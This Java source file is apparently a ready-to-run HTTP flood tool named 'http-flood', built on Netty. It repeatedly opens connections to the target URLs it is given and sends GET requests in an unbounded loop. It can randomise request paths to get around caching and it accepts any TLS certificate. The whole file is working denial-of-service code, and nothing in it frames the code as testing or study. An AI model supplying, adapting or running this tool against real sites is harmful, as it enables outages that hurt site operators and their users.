package hvqzao.http;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.ChannelOption;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpRequest;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpHeaderValues;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.HttpRequestEncoder;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.KeyManagementException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Flood {

    private final EventLoopGroup workerGroup = new NioEventLoopGroup();
    private final Bootstrap b;
    private final DefaultHttpRequest request;
    private final String host;
    private final int port;
    private final boolean randomPath;
    private static final char[] ALPHABET = "abcdefghijklmnopqrstuvwxyz".toCharArray();
    private static final int ALPHABET_LENGTH = ALPHABET.length;
    private static final Random R = new Random();
    private final int num;

    public Flood(String target, boolean randomPath, int num) throws KeyManagementException, URISyntaxException {
        this.randomPath = randomPath;
        this.num = num;
        URI uri = new URI(target);
        host = uri.getHost();
        boolean isHttps = "https".equals(uri.getScheme());
        int uriPort = uri.getPort();
        if (uriPort == -1) {
            uriPort = isHttps ? 443 : 80;
        }
        port = uriPort;
        b = new Bootstrap();
        b.group(workerGroup);
        b.channel(NioSocketChannel.class)
                .option(ChannelOption.TCP_NODELAY, true)
                .option(ChannelOption.SO_REUSEADDR, true);
        b.handler(new ChannelInitializer<SocketChannel>() {
            @Override
            public void initChannel(SocketChannel ch) throws Exception {
                if (isHttps) {
                    SslContext sslCtx = SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build();
                    ch.pipeline()
                            .addLast(sslCtx.newHandler(ch.alloc(), host, port));
                }
                ch.pipeline()
                        .addLast(new HttpRequestEncoder())
                        .addLast(new Handler());
            }
        });
        request = new DefaultHttpRequest(
                HttpVersion.HTTP_1_1,
                HttpMethod.GET,
                uri.getPath());
        request.headers()
                .set(HttpHeaderNames.HOST, host)
                .set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);
    }

    public void terminate() {
        workerGroup.shutdownGracefully();
    }

    public void go() {
        if (randomPath) {
            request.setUri(getRandomPath());
        }
        for (int i = 0; i < num; i++) {
            ChannelFuture cf = b.connect(host, port);
            cf.addListener((future) -> {
                if (future.isSuccess()) {
                    cf.channel()
                            .write(request);
                    cf.channel()
                            .flush()
                            .closeFuture();
                }
            });
        }
    }

    private class Handler extends ChannelInboundHandlerAdapter {

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }

    private static int getRandom(int max) {
        return R.nextInt(max);
    }

    private static int getRandom(int min, int max) {
        if (min > max) {
            min = max;
        }
        return R.nextInt((max - min) + 1) + min;
    }

    private static String getRandomPath() {
        return "/" + IntStream.rangeClosed(1, getRandom(1, 4)).mapToObj((int v1) -> {
            return IntStream.rangeClosed(1, getRandom(3, 10)).mapToObj((int v2) -> {
                return ALPHABET[getRandom(ALPHABET_LENGTH)];
            }).map(String::valueOf).collect(Collectors.joining());
        }).collect(Collectors.joining("/"));
    }

    public static void main(String[] args) throws KeyManagementException, URISyntaxException {
        if (args.length < 1) {
            System.err.println("Usage: http-flood [-r|--random-path] [--pool={num}] URL [URL...]");
            System.exit(1);
        }
        ArrayList<String> options = new ArrayList<>();
        ArrayList<String> targets = new ArrayList<>();
        Arrays.stream(args).forEach((String arg) -> {
            if (arg.startsWith("-")) {
                options.add(arg);
            } else {
                targets.add(arg);
            }
        });
        boolean randomPath = options.stream().anyMatch((String option) -> {
            return Arrays.asList("-r", "--random-path").contains(option);
        });
        int num = options.stream().filter((String option) -> {
            return option.startsWith("--pool=");
        }).map((String option) -> {
            System.out.println(option);
            return Integer.parseInt(option.split("=", 2)[1]);
        }).findFirst().orElse(1);
        System.out.println("Channels per thread: " + String.valueOf(num));
        ArrayList<Flood> floods = new ArrayList<>();
        for (String target : targets) {
            floods.add(new Flood(target, randomPath, num));
        }
        while (true) {
            floods.forEach((Flood flood) -> {
                flood.go();
            });
        }
        //floods.forEach((Flood flood) -> {
        //    flood.terminate();
        //});
    }

}
